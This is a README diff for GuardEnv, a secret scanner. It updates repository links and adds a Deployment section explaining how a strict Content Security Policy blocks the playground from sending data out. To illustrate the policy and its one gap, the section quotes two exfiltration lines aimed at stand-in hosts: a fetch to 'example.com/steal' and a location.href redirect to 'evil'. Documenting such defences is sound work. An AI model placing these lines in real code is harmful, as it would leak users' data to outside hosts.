@@ -6,8 +6,9 @@
 
 A fast, dependency-light secret scanner that pairs deterministic vendor signatures with Shannon entropy analysis — plus a browser playground that runs the same engine entirely offline.
 
-[![CI](https://github.com/guardenv/guardenv/actions/workflows/ci.yml/badge.svg)](https://github.com/guardenv/guardenv/actions/workflows/ci.yml)
-[![CodeQL](https://github.com/guardenv/guardenv/actions/workflows/codeql.yml/badge.svg)](https://github.com/guardenv/guardenv/actions/workflows/codeql.yml)
+[![Live demo](https://img.shields.io/badge/demo-try_it_in_your_browser-000000?logo=vercel&logoColor=white)](https://guardenv.vercel.app)
+[![CI](https://github.com/cperez233/guardenv/actions/workflows/ci.yml/badge.svg)](https://github.com/cperez233/guardenv/actions/workflows/ci.yml)
+[![CodeQL](https://github.com/cperez233/guardenv/actions/workflows/codeql.yml/badge.svg)](https://github.com/cperez233/guardenv/actions/workflows/codeql.yml)
 [![Python](https://img.shields.io/badge/python-3.10%20|%203.11%20|%203.12%20|%203.13-3776AB?logo=python&logoColor=white)](https://pypi.org/project/guardenv/)
 [![License: MIT](https://img.shields.io/badge/license-MIT-10b981.svg)](LICENSE)
 [![PRs welcome](https://img.shields.io/badge/PRs-welcome-f43f5e.svg)](CONTRIBUTING.md)
@@ -73,7 +74,7 @@ The image is a two-stage Alpine build that ships only a virtualenv and runs as a
 ```yaml
 # .pre-commit-config.yaml
 repos:
-  - repo: https://github.com/guardenv/guardenv
+  - repo: https://github.com/cperez233/guardenv
     rev: v1.0.0
     hooks:
       - id: guardenv
@@ -150,6 +151,7 @@ guardenv/
 │   ├── baseline.py     Acknowledge existing findings so CI only fails on new ones
 │   └── cli.py          Typer interface, exit codes
 ├── web/                React + TypeScript playground (the same engine, client-side)
+│   └── vercel.json     CSP that enforces `connect-src 'none'` in production
 ├── tests/              222 tests
 └── scripts/benchmark.py
 ```
@@ -168,6 +170,37 @@ cd web && npm install && npm run dev
 - **Entropy simulator** — a slider over the Shannon threshold (3.0 → 6.0) with a scatter plot of every candidate token in the document. Tokens above the line are flagged; tokens drawn with a dashed outline cleared the threshold but were dropped by a heuristic, so you can see *why* something was not reported.
 - **Analysis modes** — signatures only, entropy only, or both.
 - **Export** — copy or download the report as GuardEnv JSON or SARIF 2.1.0, byte-compatible with what the CLI emits.
+
+### Deployment
+
+The playground is deployed as a static site with a CSP that turns its central
+claim into something the browser enforces rather than something the README
+asserts:
+
+```
+connect-src 'none'
+```
+
+Verified against the production build, including the channels CORS does *not*
+protect against — an exfiltrator never needs to read a response, only to send a
+request. `fetch`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`, image
+beacons, injected `<script>`/`<link>` tags, cross-origin form posts and even
+same-origin `fetch` are all refused before they reach the network. Open DevTools
+on the deployed site and run `fetch("https://example.com/steal")` — you get a CSP
+violation, not a request.
+
+The honest limit: top-level navigation (`location.href = "https://evil/?d=…"`)
+is not blocked, because no CSP directive covers it. Reaching that requires script
+execution the policy otherwise prevents, and unlike every channel above it is not
+silent — the page the user was looking at disappears.
+[`web/DEPLOYMENT.md`](web/DEPLOYMENT.md) has the full evidence table.
+
+[`web/vercel.json`](web/vercel.json) carries that policy plus HSTS, `no-referrer`,
+`nosniff`, `frame-ancestors 'none'` and a locked-down `Permissions-Policy`. Set
+**Root Directory** to `web` when importing the repository and everything else is
+automatic. [`web/DEPLOYMENT.md`](web/DEPLOYMENT.md) covers the details, the two
+things that will break the CSP, and how to drop the Google Fonts dependency to
+make the page fully self-contained.
 
 The TypeScript port is not a reimplementation-by-eye: `web/src/engine/engine.test.ts`'s 81 tests pin the same expectations as the Python suite (same entropy values, same charset thresholds, same benign-shape reasons, same rule ids), so the two engines cannot drift apart silently.
 
